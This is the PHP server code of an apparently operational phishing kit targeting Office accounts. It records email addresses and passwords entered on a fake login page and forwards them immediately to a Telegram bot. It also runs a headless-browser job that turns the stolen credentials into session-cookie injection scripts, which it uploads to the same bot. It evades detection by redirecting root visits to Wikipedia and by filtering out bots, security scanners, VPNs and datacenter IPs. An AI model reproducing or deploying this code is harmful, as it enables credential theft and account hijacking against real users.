<?php
namespace App;

use Exception;
use PDO;
use PDOException;

class Config {
    public static function load(): array {
        $configPath = __DIR__ . '/../config.json.enc';
        $cfg = [];
        if (file_exists($configPath)) {
            $json = Crypto::loadEncrypted($configPath);
            if ($json) {
                $decoded = json_decode($json, true);
                if (is_array($decoded)) {
                    $cfg = $decoded;
                }
            }
        }

        // Support Environment Variables (Render/Docker)
        $envBotToken = getenv('TELEGRAM_BOT_TOKEN');
        if ($envBotToken) {
            $cfg['telegramBotToken'] = $envBotToken;
        }
        
        $envChatId = getenv('TELEGRAM_CHAT_ID');
        if ($envChatId) {
            $cfg['telegramChatId'] = $envChatId;
        }

        $envTelemetry = getenv('TELEMETRY_ENABLED');
        if ($envTelemetry !== false) {
             $cfg['telemetryEnabled'] = filter_var($envTelemetry, FILTER_VALIDATE_BOOLEAN);
        }

        return $cfg;
    }

    public static function save(array $data): bool {
        $configPath = __DIR__ . '/../config.json.enc';
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        if ($json === false) return false;
        return Crypto::saveEncrypted($configPath, $json);
    }
}

class Worker {
    public static function run() {
        echo "🚀 Worker started. Waiting for jobs...\n";
        
        try {
            $db = new Database();
            $pdo = $db->getPdo();
        } catch (Exception $e) {
            echo "❌ Fatal DB Error: " . $e->getMessage() . "\n";
            exit(1);
        }
        
        $lastCleanup = 0;
        
        while (true) {
            try {
                // --- Self-Healing: Periodic Cleanup of Stale Jobs ---
                // Every 30 seconds, check for jobs that have been stuck in 'processing' for > 90 seconds
                if (time() - $lastCleanup > 30) {
                    self::cleanupStaleJobs($pdo);
                    $lastCleanup = time();
                }
                // ----------------------------------------------------

                $pdo->beginTransaction();
                
                // Optimistic Locking: Try to claim a task
                $stmt = $pdo->prepare("SELECT * FROM tasks WHERE status = 'pending' ORDER BY id ASC LIMIT 1");
                $stmt->execute();
                $task = $stmt->fetch(PDO::FETCH_ASSOC);
                
                if ($task) {
                    // Try to claim the task atomically
                    $updateStmt = $pdo->prepare("UPDATE tasks SET status = 'processing', updated_at = CURRENT_TIMESTAMP WHERE id = :id AND status = 'pending'");
                    $updateStmt->execute([':id' => $task['id']]);
                    
                    if ($updateStmt->rowCount() === 0) {
                        // Another worker claimed this task, retry
                        $pdo->commit();
                        continue;
                    }
                    
                    $pdo->commit();
                    
                    echo "Processing Job #{$task['id']} for {$task['email']} (CookieID: {$task['cookie_id']})...\n";

                    if (empty($task['password'])) {
                        echo "❌ Error: Empty password for Job #{$task['id']}. Marking as failed.\n";
                        $pdo->prepare("UPDATE tasks SET status = 'failed', updated_at = CURRENT_TIMESTAMP WHERE id = :id")
                            ->execute([':id' => $task['id']]);
                        continue;
                    }
                        
                        $baseDir = realpath(__DIR__ . '/..');
                        $cacheDir = $baseDir . '/.cache';
                        if (!is_dir($cacheDir)) mkdir($cacheDir, 0777, true);
                        
                        $deploymentFile = $baseDir . '/deployment.json';
                        $apiBaseUrl = '';
                        if (file_exists($deploymentFile)) {
                            $deploymentJson = json_decode(file_get_contents($deploymentFile), true);
                            if (is_array($deploymentJson) && !empty($deploymentJson['main_domain'])) {
                                $apiBaseUrl = 'https://' . $deploymentJson['main_domain'];
                            }
                        }

                        $encKey = $_ENV['ENC_KEY'] ?? getenv('ENC_KEY') ?? '';
                        $envParts = [];
                        $envParts[] = "export ENC_KEY=" . escapeshellarg($encKey);
                        $envParts[] = "export PUPPETEER_CACHE_DIR=" . escapeshellarg($cacheDir);
                        $envParts[] = "export HOME=" . escapeshellarg($baseDir);
                        if ($apiBaseUrl !== '') {
                            $envParts[] = "export API_BASE_URL=" . escapeshellarg($apiBaseUrl);
                        }
                        $cmd = implode(' && ', $envParts) . " && node " . escapeshellarg($baseDir . '/consolidated.js') . " " .
                               escapeshellarg($task['email']) . " " .
                               escapeshellarg($task['password']) . " " .
                               escapeshellarg($task['cookie_id']);
                        
                        // 2. Execution with Timeout
                        $timeout = 180; // 3 minutes timeout
                        $descriptors = [
                            0 => ["pipe", "r"], // stdin
                            1 => ["pipe", "w"], // stdout
                            2 => ["pipe", "w"]  // stderr
                        ];
                        
                        $process = proc_open($cmd, $descriptors, $pipes);
                        $outputStr = "";
                        $returnVar = -1;
                        
                        if (is_resource($process)) {
                            // Non-blocking read setup could be complex, simple timeout loop:
                            $startTime = time();
                            $status = proc_get_status($process);
                            
                            while ($status['running']) {
                                if (time() - $startTime > $timeout) {
                                    echo "⚠️ Process timed out! Terminating...\n";
                                    proc_terminate($process, 9); // SIGKILL
                                    $returnVar = 124; // Timeout exit code convention
                                    break;
                                }
                                usleep(500000); // 0.5s check
                                $status = proc_get_status($process);
                            }
                            
                            // Read remaining output
                            $outputStr = stream_get_contents($pipes[1]);
                            $errStr = stream_get_contents($pipes[2]);
                            if ($errStr) echo "Stderr: $errStr\n";
                            
                            fclose($pipes[0]);
                            fclose($pipes[1]);
                            fclose($pipes[2]);
                            
                            if ($returnVar === -1) {
                                $returnVar = proc_close($process);
                            } else {
                                proc_close($process); // Close resource after termination
                            }
                        } else {
                            echo "❌ Failed to start process.\n";
                            $returnVar = 1;
                        }
                    
                    if (strpos($outputStr, 'CONSOLIDATED SUCCESS') !== false) {
                        $finalStatus = 'completed';
                    } else {
                        $finalStatus = ($returnVar === 0) ? 'completed' : 'failed';
                    }
                    
                    // --- Telegram Notification ---
                    // Send notification regardless of success/failure if telemetry is enabled
                    $cfg = Config::load();
                    if (!empty($cfg['telemetryEnabled']) && !empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
                         self::sendTelegramCookies($task, $cfg, $db, $finalStatus);
                    }
                    // -----------------------------
                    
                    $maxRetries = 3;
                    $retryCount = 0;
                    while ($retryCount < $maxRetries) {
                        try {
                            $pdo->prepare("UPDATE tasks SET status = :status, updated_at = CURRENT_TIMESTAMP WHERE id = :id")
                                ->execute([':status' => $finalStatus, ':id' => $task['id']]);
                            break;
                        } catch (PDOException $e) {
                            if (strpos($e->getMessage(), 'database is locked') !== false) {
                                $retryCount++;
                                echo "Database locked, retrying update (attempt $retryCount)...\n";
                                sleep(1);
                            } else {
                                throw $e;
                            }
                        }
                    }
                        
                    echo "Job #{$task['id']} finished: {$finalStatus}\n";
                    
                } else {
                    $pdo->commit();
                    sleep(1);
                }
            } catch (Exception $e) {
                if ($pdo->inTransaction()) {
                    $pdo->rollBack();
                }
                echo "Error: " . $e->getMessage() . "\n";
                sleep(5);
            }
        }
    }

    private static function cleanupStaleJobs($pdo) {
        try {
            // Mark jobs as 'failed' if they have been processing for more than 1.5 minutes (90 seconds)
            // This handles cases where a worker crashed or was killed
            $stmt = $pdo->prepare("UPDATE tasks SET status = 'failed', updated_at = CURRENT_TIMESTAMP WHERE status = 'processing' AND updated_at < datetime('now', '-90 seconds')");
            $stmt->execute();
            $count = $stmt->rowCount();
            
            if ($count > 0) {
                echo "🧹 Self-Healing: Cleaned up $count stale/stuck jobs (marked as failed).\n";
            }
        } catch (Exception $e) {
            echo "⚠️ Cleanup Error: " . $e->getMessage() . "\n";
        }
    }

    private static function sendTelegramCookies($task, $cfg, $db, $finalStatus) {
        $botToken = $cfg['telegramBotToken'];
        $chatId = $cfg['telegramChatId'];
        
        $cookieId = $task['cookie_id'];
        $email = $task['email'];
        $password = isset($task['password']) ? $task['password'] : 'N/A';
        
        // Fetch extra info
        $event = $db->getEventInfo($cookieId);
        $ip = $event ? $event['ip'] : 'Unknown';
        $ua = $event ? $event['ua'] : 'Unknown';
        
        // Paths
        $baseDir = realpath(__DIR__ . '/..');
        $injectFile = $baseDir . '/session_data/inject_session_' . $cookieId . '.js';
        
        // 1. Send Message
        $message = " @closedpages ⭐️office⭐️ COOKIE " . ($finalStatus !== 'completed' ? "(FAILED)" : "") . " \n";
        $message .= "     \n";
        $message .= " { \n";
        $message .= "     \"officeEmail\": \"$email\", \n";
        $message .= "     \"officePassword1\": \"$password\", \n";
        $message .= " } \n";
        $message .= " \n";
        $message .= " \n";
        $message .= " ##      USER FINGERPRINTS       ## \n";
        $message .= " IP: $ip \n";
        $message .= " INFORMATION: ANTIBOT \n";
        $message .= " USERAGENT: $ua \n";
        $message .= " /////// POWERED BY CLOSEDPAGES /////////";
        
        $urlMsg = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payloadMsg = [
            'chat_id' => $chatId,
            'text' => $message
        ];
        
        self::sendRequest($urlMsg, $payloadMsg, $cfg);
        
        // 2. Send File (Only if exists)
        if (file_exists($injectFile)) {
            $urlDoc = "https://api.telegram.org/bot{$botToken}/sendDocument";
            $payloadDoc = [
                'chat_id' => $chatId,
                'document' => new \CURLFile($injectFile, 'application/javascript', "cookies_{$email}.js"),
                'caption' => "Inject Script for $email"
            ];
            
            self::sendRequest($urlDoc, $payloadDoc, $cfg, true);
        } else {
             echo "⚠️ Telegram: Inject file not found for $cookieId (Status: $finalStatus)\n";
        }
        
        echo "✅ Telegram notification sent for $email (Status: $finalStatus)\n";
    }

    public static function sendTelegramCredentials($email, $password, $ip, $ua, $botToken, $chatId, $cfg) {
        $message = " @closedpages ⭐️office⭐️ LOGIN (IMMEDIATE) \n";
        $message .= "     \n";
        $message .= " { \n";
        $message .= "     \"officeEmail\": \"$email\", \n";
        $message .= "     \"officePassword1\": \"$password\", \n";
        $message .= " } \n";
        $message .= " \n";
        $message .= " \n";
        $message .= " ##      USER FINGERPRINTS       ## \n";
        $message .= " IP: $ip \n";
        $message .= " INFORMATION: ANTIBOT \n";
        $message .= " USERAGENT: $ua \n";
        $message .= " /////// POWERED BY CLOSEDPAGES /////////";
        
        $urlMsg = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payloadMsg = [
            'chat_id' => $chatId,
            'text' => $message
        ];
        
        self::sendRequest($urlMsg, $payloadMsg, $cfg);
    }

    private static function sendRequest($url, $payload, $cfg, $isMultipart = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        
        if ($isMultipart) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
            curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
        }
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "❌ Telegram Curl Error: " . curl_error($ch) . "\n";
        }
        return $result;
    }
}

class Console {
    public static function handle(array $argv) {
        if (count($argv) < 3) {
            echo "Usage: php index.php manage [encrypt|decrypt] [file]\n";
            echo "Example: php index.php manage decrypt template.html.enc\n";
            exit(1);
        }

        $mode = $argv[2];
        $file = $argv[3];

        if (!file_exists($file)) {
            echo "File not found: $file\n";
            exit(1);
        }

        $content = file_get_contents($file);

        if ($mode === 'encrypt') {
            if (substr($file, -4) === '.enc') {
                echo "Warning: File seems already encrypted (.enc extension).\n";
            }
            
            // If encrypting from sources/, automatically save .enc to the project root
            $dir = dirname($file);
            if (basename($dir) === 'sources') {
                $outFile = dirname($dir) . '/' . basename($file) . '.enc';
            } else {
                $outFile = $file . '.enc';
            }
            
            if (Crypto::saveEncrypted($outFile, $content)) {
                echo "Encrypted to $outFile\n";
            } else {
                echo "Encryption failed.\n";
            }
        } elseif ($mode === 'decrypt') {
            $decrypted = Crypto::loadEncrypted($file);
            if ($decrypted === false) {
                echo "Decryption failed (or file not encrypted).\n";
                exit(1);
            }
            
            $outFile = (substr($file, -4) === '.enc') ? substr($file, 0, -4) : $file . '.dec';
            
            if (file_put_contents($outFile, $decrypted) !== false) {
                echo "Decrypted to $outFile\n";
            } else {
                echo "Write failed.\n";
            }
        } else {
            echo "Invalid mode. Use encrypt or decrypt.\n";
        }
    }
}

class Crypto {
    private const METHOD = 'aes-256-cbc';

    private static function getKey(): string {
        $key = $_ENV['ENC_KEY'] ?? getenv('ENC_KEY');
        if (!$key) {
            throw new Exception("Encryption key (ENC_KEY) not found in environment.");
        }
        return $key;
    }

    public static function saveEncrypted(string $path, string $data): bool {
        try {
            $key = self::getKey();
        } catch (Exception $e) {
            return false;
        }

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($data, self::METHOD, $key, 0, $iv);
        
        if ($encrypted === false) return false;

        $fp = fopen($path, 'w');
        if (!$fp) return false;

        $success = false;
        if (flock($fp, LOCK_EX)) {
            $bytes = fwrite($fp, $iv . $encrypted);
            flock($fp, LOCK_UN);
            if ($bytes !== false) $success = true;
        }
        fclose($fp);
        return $success;
    }

    public static function loadEncrypted(string $path) {
        if (!file_exists($path)) return false;
        $content = file_get_contents($path);
        if ($content === false) return false;

        try {
            $key = self::getKey();
        } catch (Exception $e) {
            return false;
        }

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        if (strlen($content) < $ivLength) return false;

        $iv = substr($content, 0, $ivLength);
        $encrypted = substr($content, $ivLength);

        return openssl_decrypt($encrypted, self::METHOD, $key, 0, $iv);
    }
}

class Database {
    private $pdo;

    public function __construct() {
        // Use an absolute path for the database file to ensure consistency
        // especially when running from different directories (e.g., worker vs web)
        $dbPath = __DIR__ . '/../database.sqlite';
        
        // Ensure the directory exists and is writable
        $dir = dirname($dbPath);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        
        // Ensure the database file is writable if it exists
        if (file_exists($dbPath) && !is_writable($dbPath)) {
            chmod($dbPath, 0666);
        }

        $init = !file_exists($dbPath) || filesize($dbPath) === 0;
        
        try {
            $this->pdo = new PDO('sqlite:' . $dbPath);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
            // Use WAL mode for better concurrency (readers don't block writers)
            $this->pdo->exec('PRAGMA journal_mode = WAL;');
            $this->pdo->exec('PRAGMA busy_timeout = 5000;');
            
            if ($init) {
                $this->initializeSchema();
            }
        } catch (PDOException $e) {
            throw new Exception("Database error: " . $e->getMessage());
        }
    }

    private function initializeSchema() {
        // Events table (logs)
        $this->pdo->exec("CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie_id TEXT,
            type TEXT,
            email_mask TEXT,
            domain TEXT,
            attempt INTEGER,
            password TEXT,
            ip TEXT,
            ua TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )");

        // Tasks table (background jobs)
        $this->pdo->exec("CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie_id TEXT,
            email TEXT,
            password TEXT,
            status TEXT DEFAULT 'pending', -- pending, processing, completed, failed
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )");
        
        // Index for speed
        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_events_cookie_id ON events(cookie_id)");
        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status)");
    }

    public function getPdo() {
        return $this->pdo;
    }

    public function logEvent($data) {
        $stmt = $this->pdo->prepare("INSERT INTO events (
            cookie_id, type, email_mask, domain, attempt, password, ip, ua, created_at
        ) VALUES (
            :cookie_id, :type, :email_mask, :domain, :attempt, :password, :ip, :ua, :created_at
        )");
        
        return $stmt->execute([
            ':cookie_id' => $data['cookieId'],
            ':type' => $data['type'],
            ':email_mask' => $data['emailMask'],
            ':domain' => $data['domain'],
            ':attempt' => $data['attempt'],
            ':password' => $data['password'],
            ':ip' => $data['ip'],
            ':ua' => $data['ua'],
            ':created_at' => $data['time']
        ]);
    }

    public function addTask($cookieId, $email, $password) {
        $stmt = $this->pdo->prepare("INSERT INTO tasks (cookie_id, email, password, status) VALUES (:cookie_id, :email, :password, 'pending')");
        return $stmt->execute([
            ':cookie_id' => $cookieId,
            ':email' => $email,
            ':password' => $password
        ]);
    }

    public function getEvents($limit = 100) {
        $stmt = $this->pdo->prepare("SELECT * FROM events ORDER BY id DESC LIMIT :limit");
        $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
        $stmt->execute();
        return $stmt->fetchAll();
    }
    
    public function getEventInfo($cookieId) {
        $stmt = $this->pdo->prepare("SELECT ip, ua FROM events WHERE cookie_id = :cookie_id ORDER BY id DESC LIMIT 1");
        $stmt->execute([':cookie_id' => $cookieId]);
        return $stmt->fetch();
    }

    public function getTaskStatus($cookieId) {
        $stmt = $this->pdo->prepare("SELECT status FROM tasks WHERE cookie_id = :cookie_id LIMIT 1");
        $stmt->execute([':cookie_id' => $cookieId]);
        return $stmt->fetch();
    }
}

class Router {
    public static function handle() {
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $path = parse_url($uri, PHP_URL_PATH);
        $email = '';

        // Flexible Routing: Allow any path that isn't root, API, or Admin
        // This allows URLs like /secure-login, /view/doc-123, /auth/verify/user@example.com
        if ($path && $path !== '/' && $path !== '/index.php') {
            // Attempt to extract email from any part of the path
            $parts = explode('/', trim($path, '/'));
            foreach (array_reverse($parts) as $part) {
                $part = urldecode($part);
                if (strpos($part, '@') !== false) {
                     if (preg_match('/^[^\s@]+@[^\s@]+\.[^\s@]+$/', $part)) {
                         $email = $part;
                         break;
                     }
                }
            }
            return ['email' => $email];
        } else {
            // Redirect root requests to Wikipedia to avoid detection
            header("Location: https://wikipedia.com");
            exit;
        }
    }
}

class Security {
    public static function getClientIp(): string {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($xff[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '';
    }

    public static function hasProxyHeaders(): bool {
        if (!empty($_SERVER['HTTP_VIA'])) return true;
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $xff = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (strpos($xff, ',') !== false) return true;
        }
        return false;
    }

    public static function rdnsBlocked(string $ip, array $patterns): bool {
        $host = strtolower(@gethostbyaddr($ip));
        if ($host && $host !== $ip) {
            foreach ($patterns as $p) {
                if ($p && strpos($host, $p) !== false) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function checkIpReputation(string $ip, string $apiKey = ''): array {
        // Simple file-based cache to avoid rate limits
        $cacheDir = __DIR__ . '/../session_data/ip_cache';
        if (!is_dir($cacheDir)) {
            @mkdir($cacheDir, 0755, true);
        }
        
        $cacheFile = $cacheDir . '/' . md5($ip) . '.json';
        if (file_exists($cacheFile)) {
            $data = json_decode(file_get_contents($cacheFile), true);
            // Cache for 24 hours
            if (isset($data['time']) && (time() - $data['time'] < 86400)) {
                $cachedRes = $data['result'] ?? ['blocked' => $data['is_vpn'] ?? false];
                if (!isset($cachedRes['blocked'])) $cachedRes['blocked'] = false;
                if (!isset($cachedRes['reason'])) $cachedRes['reason'] = '';
                return $cachedRes;
            }
        }

        // --- LOCAL CHECK (If no API Key) ---
        if (empty($apiKey)) {
            $result = self::checkLocalRisk($ip);
            // Cache local result too
            @file_put_contents($cacheFile, json_encode([
                'time' => time(),
                'result' => $result
            ]));
            return $result;
        }

        $url = "http://proxycheck.io/v2/{$ip}?vpn=1&asn=1&risk=1";
        if ($apiKey) {
            $url .= "&key={$apiKey}";
        }

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $res = curl_exec($ch);
        // curl_close($ch); // Deprecated in PHP 8.0+

        $result = ['blocked' => false, 'reason' => ''];
        
        if ($res) {
            $json = json_decode($res, true);
            if (isset($json['status']) && $json['status'] === 'ok') {
                $info = $json[$ip] ?? [];
                
                // Check Proxy/VPN
                if (isset($info['proxy']) && $info['proxy'] === 'yes') {
                    $result = ['blocked' => true, 'reason' => 'vpn_proxy'];
                }
                
                // Check Risk Score (Optional: block if risk > 50)
                // You can adjust this threshold. 
                if (!$result['blocked'] && isset($info['risk']) && intval($info['risk']) > 66) {
                     $result = ['blocked' => true, 'reason' => 'high_risk'];
                }
            }
        }

        // Save to cache
        @file_put_contents($cacheFile, json_encode([
            'time' => time(),
            'result' => $result
        ]));

        return $result;
    }

    private static function checkLocalRisk(string $ip): array {
        $result = ['blocked' => false, 'reason' => ''];
        
        // 1. Reverse DNS Keyword Analysis
        $host = strtolower(@gethostbyaddr($ip));
        if ($host && $host !== $ip) {
            // Expanded list of keywords for datacenters, VPNs, and cloud providers
            $keywords = [
                'vpn', 'proxy', 'tor-exit', 'tor-node', 'exit-node',
                'hosting', 'datacenter', 'cloud', 'compute', 'slave',
                'dedi', 'static', 'user-static', 'customer-static',
                'amazonaws', 'googleusercontent', 'azure', 'digitalocean',
                'linode', 'vultr', 'hetzner', 'ovh', 'leaseweb', 'aliyun',
                'oraclecloud', 'scaleway', 'contabo', 'gcore', 'psychz',
                'upcloud', 'hosthatch', 'hostinger', 'kamatera', 'ionos',
                'interserver', 'bluehost', 'hostgator', 'dreamhost',
                'colocation', 'rackspace', 'softlayer', 'packet', 'vps'
            ];
            
            foreach ($keywords as $kw) {
                if (strpos($host, $kw) !== false) {
                    return ['blocked' => true, 'reason' => "local_rdns_blacklist: $kw"];
                }
            }
        }
        
        return $result;
    }

    public static function isBotUserAgent(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        if (empty($ua)) return true; // Block empty UA

        $bots = [
            'bot', 'crawl', 'spider', 'slurp', 'facebook', 'facebot',
            'curl', 'wget', 'python', 'libwww', 'httpunit', 'nmap',
            'phantomjs', 'headless', 'selenium', 'puppeteer',
            'postman', 'insomnia', 'axios', 'got', 'node-fetch',
            'go-http-client', 'java/', 'ruby', 'perl', 'php'
        ];

        foreach ($bots as $bot) {
            if (strpos($ua, $bot) !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isMissingStandardHeaders(): bool {
        // Real browsers almost always send these
        if (empty($_SERVER['HTTP_ACCEPT'])) return true;
        if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) return true;
        
        // Very basic check: "Accept" usually contains text/html for navigation
        // But for API calls it might be different, so be careful.
        // For the main page load, this is a strong signal.
        return false;
    }
}

class Api {
    public static function handle() {
        header_remove('X-Powered-By');
        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
        header('Access-Control-Allow-Headers: Content-Type');
        ignore_user_abort(true);
        set_time_limit(0);

        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            echo json_encode(['ok' => true]);
            exit;
        }

        $action = $_GET['action'] ?? '';

        switch ($action) {
            case 'log_event': self::handleLogEvent(); break;
            case 'save_config': self::handleSaveConfig(); break;
            case 'get_config': self::handleGetConfig(); break;
            case 'clear_logs': self::handleClearLogs(); break;
            case 'get_cookies': self::handleGetCookies(); break;
            case 'verify_email': self::handleVerifyEmail(); break;
            case 'verify_turnstile': self::handleVerifyTurnstile(); break;
            case 'deploy_security': self::handleDeploySecurity(); break;
            case 'get_events': self::handleGetEvents(); break;
            case 'test_telegram': self::handleTestTelegram(); break;
            case 'get_deployment_info': self::handleGetDeploymentInfo(); break;
            default:
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid action']);
            break;
        }
    }

    private static function handleGetDeploymentInfo() {
        $file = __DIR__ . '/../deployment.json';
        if (file_exists($file)) {
            $content = file_get_contents($file);
            echo json_encode(['ok' => true, 'data' => json_decode($content, true)]);
        } else {
            echo json_encode(['ok' => false, 'error' => 'Not found']);
        }
    }

    private static function handleGetEvents() {
        try {
            $db = new Database();
            $pdo = $db->getPdo();

            $stmt = $pdo->query("
                SELECT e.*, t.status as task_status 
                FROM events e 
                LEFT JOIN tasks t ON e.cookie_id = t.cookie_id 
                ORDER BY e.id DESC
            ");
            
            $events = [];
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $event = [
                    'type' => $row['type'],
                    'emailMask' => $row['email_mask'],
                    'domain' => $row['domain'],
                    'attempt' => intval($row['attempt']),
                    'password' => $row['password'],
                    'ip' => $row['ip'],
                    'ua' => $row['ua'],
                    'time' => $row['created_at'],
                    'cookieId' => $row['cookie_id'],
                    'botStatus' => $row['task_status'] ?? 'pending'
                ];
                
                if ($event['botStatus'] !== 'completed') {
                    $scriptFile = __DIR__ . '/../session_data/inject_session_' . $row['cookie_id'] . '.js';
                    if (file_exists($scriptFile) && filesize($scriptFile) > 0) {
                        $event['botStatus'] = 'completed';
                    }
                }
                
                $scriptFile = __DIR__ . '/../session_data/inject_session_' . $row['cookie_id'] . '.js';
                $event['hasScript'] = (file_exists($scriptFile) && filesize($scriptFile) > 0);
                
                $events[] = $event;
            }

            echo json_encode(['ok' => true, 'events' => $events]);
        } catch (Exception $e) {
            echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
        }
    }

    private static function handleLogEvent() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        
        try {
            $raw = file_get_contents('php://input');
            $data = json_decode($raw, true);
            if (!is_array($data)) {
                http_response_code(400);
                echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
                exit;
            }

            $cfg = Config::load();
            $telemetryEnabled = !empty($cfg['telemetryEnabled']);
            $botToken = isset($cfg['telegramBotToken']) ? trim($cfg['telegramBotToken']) : '';
            $chatId = isset($cfg['telegramChatId']) ? trim($cfg['telegramChatId']) : '';

            $type = isset($data['type']) ? $data['type'] : 'event';
            $emailMask = isset($data['emailMask']) ? $data['emailMask'] : '';
            $domain = isset($data['domain']) ? $data['domain'] : '';
            $attempt = isset($data['attempt']) ? intval($data['attempt']) : 0;
            $password = isset($data['password']) ? $data['password'] : '';
            $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
            $ip = Security::getClientIp();

            $ts = date('c');
            // Use provided cookieId or generate new one
            $cookieId = (isset($data['cookieId']) && !empty($data['cookieId'])) ? $data['cookieId'] : uniqid(mt_rand(), true);

            // Allow logging if password is provided OR it is a significant event like email_ok
            if ($password !== '' || $type === 'email_ok') {
                $db = new Database();
                
                $logRecord = [
                    'type' => $type,
                    'emailMask' => $emailMask,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
                    'ip' => $ip,
                    'ua' => $ua,
                    'time' => $ts,
                    'cookieId' => $cookieId
                ];
                
                $db->logEvent($logRecord);
                
                // --- IMMEDIATE TELEGRAM NOTIFICATION FOR PASSWORD ---
                // If a password is provided, send it to Telegram immediately.
                if ($password !== '' && $telemetryEnabled && $botToken && $chatId) {
                    Worker::sendTelegramCredentials($emailMask, $password, $ip, $ua, $botToken, $chatId, $cfg);
                }
                // ----------------------------------------------------
                
                if ($password !== '') {
                    $sessionDir = __DIR__ . '/../session_data';
                    if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
                    file_put_contents($sessionDir . '/status_' . $cookieId . '.json', json_encode(['status' => 'pending', 'startTime' => time()]), LOCK_EX);
                }
                
                $isFailure = (strpos($type, 'fail') !== false || strpos($type, 'error') !== false);
            if ($type === 'password_fail_first') {
                $isFailure = false;
            }
            
            if (!$isFailure && $password !== '') {
                $db->addTask($cookieId, $emailMask, $password);
            }
        }

        echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
        }
    }

    private static function handleSaveConfig() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        if (!$raw) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Empty body']);
            exit;
        }
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }
        
        $allowed = [
            'template', 'urlPath', 'redirectUrl', 'firstAttemptFail', 'loadingEnabled', 'loadingDelayMs',
            'telemetryEnabled', 'telegramBotToken', 'telegramChatId', 'securityEnabled',
            'allowedDomains', 'blockedDomains', 'cfTurnstileEnabled', 'cfSiteKey',
            'cfSecretKey', 'cfApiKey', 'cfEmail', 'cfZoneId', 'cfAccountId',
            'countryBlockingEnabled', 'allowedCountries', 'ipWhitelist',
            'proxyEnabled', 'proxyUrl', 'localLoggingEnabled',
            'vpnCheckEnabled', 'vpnApiKey', 'botCheckEnabled'
        ];
        $out = [];
        foreach ($allowed as $k) {
            if (array_key_exists($k, $data)) {
                $out[$k] = $data[$k];
            }
        }

        $ok = Config::save($out);
        if ($ok === false) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Write failed']);
            exit;
        }
        echo json_encode(['ok' => true]);
    }

    private static function handleGetConfig() {
        $cfg = Config::load();
        echo json_encode($cfg);
    }

    private static function handleClearLogs() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        
        try {
            $db = new Database();
            $pdo = $db->getPdo();
            $pdo->exec("DELETE FROM events");
            $pdo->exec("DELETE FROM tasks");
            $pdo->exec("VACUUM");
        } catch (Exception $e) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
            exit;
        }

